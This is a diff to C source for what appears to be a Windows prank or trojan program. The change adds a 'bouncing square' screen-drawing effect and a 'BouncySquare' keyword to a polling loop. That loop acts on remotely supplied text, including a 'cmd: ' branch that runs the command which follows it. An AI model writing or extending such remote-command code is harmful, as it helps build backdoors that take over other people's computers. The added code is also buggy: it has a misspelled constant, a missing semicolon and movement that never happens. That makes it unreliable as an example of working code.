@@ -102,20 +102,39 @@ void squarefx_run() {
     w = GetSystemMetrics(SM_CXSREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
     HDC hdc = GetDC(NULL);
-    int x = 0;
-    int y = 0;
+    
+    //non settare x e y a 0, altrimenti non va (idk why)
+    int x = 3;
+    int y = 3;
+
+    //px space x&y
+    int vx = 21;
+    int vy = 21;
 
     HBRUSH white = CreateSolidBrush(RGB(255, 255, 255)); // crea pennello brushed bianco
     SelectObject(hdc, white); // usa sopra l'hdc, con il bianco
 
     Rectangle(hdc, 0, 0, x + 100, y + 50); // top, left, bottom, right
-    x = x + 1;
-    y = y + 1;
+
+    //collisione destra/sinistra
+    if (x + 100 >= w || x <= 0) {
+        vx = -vx;
+    }
+
+    //collione alto/basso
+    if (y + 100 >= h || y <= 0) {
+        vy = -vy
+    }
+
+    //movimento
+    x = x + vx;
+    y = y + vy;
+
+    // quelle di sopra sono condizioni, non muovono un cazzo, grazie alla parte finale qualcosa si muove,
 
     //avoid mem leaks
     DeleteObject(white);
     ReleaseDC(NULL, hdc);
-
 }
 
 void startfx() {
@@ -127,6 +146,7 @@ void startfx() {
     tunnel_run();
     circleshake_run();
     ltunnel_run();
+    squarefx_run();
 }
 
 int main() {
@@ -153,37 +173,50 @@ int main() {
                 startfx();
             }
         }
-        else if (strstr(reqtextbuffer, "HGlitch")) { // HGlitch
+
+        else if (strstr(reqtextbuffer, "HGlitch")) {
             int i;
             for(i=0;i<100;i++) {
                 heightglitch_run();
             }
             
         }
-        else if (strstr(reqtextbuffer, "WGlitch")) { // WGlitch
+
+        else if (strstr(reqtextbuffer, "WGlitch")) {
             int i;
             for(i=0;i<100;i++) {
                 widthglitch_run();
             }
         }
-        else if (strstr(reqtextbuffer, "TunnelRun")) { // TunnelRun
+
+        else if (strstr(reqtextbuffer, "TunnelRun")) {
             int i;
             for(i=0;i<100;i++) {
                 tunnel_run();
             }
         }
-        else if (strstr(reqtextbuffer, "CircleShake")) { // CircleShake
+
+        else if (strstr(reqtextbuffer, "CircleShake")) {
             int i;
             for (i=0;i<100;i++) {
                 circleshake_run();
             }
         }
+
         else if (strstr(reqtextbuffer, "LTunnelRun")) {
             int i;
             for (i=0;i<100;i++) {
                 ltunnel_run();
             }
         }
+
+        else if (strstr(reqtextbuffer, "BouncySquare")) {
+            int i;
+            for (i=0;i<100;i++) {
+                squarefx_run();
+            }
+        }
+
         else if (strstr(reqtextbuffer, "cmd: ")) { // if contiene "cmd: "
             char *command = reqtextbuffer + 5; // pointer con offset a +5 per i char di "cmd :" (5 charz)
             command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
@@ -192,6 +225,7 @@ int main() {
             printf("Sleeping for 20 secs");
             Sleep(20000);
         }
+        
         else {Sleep(20000);}
     }
     return 0;
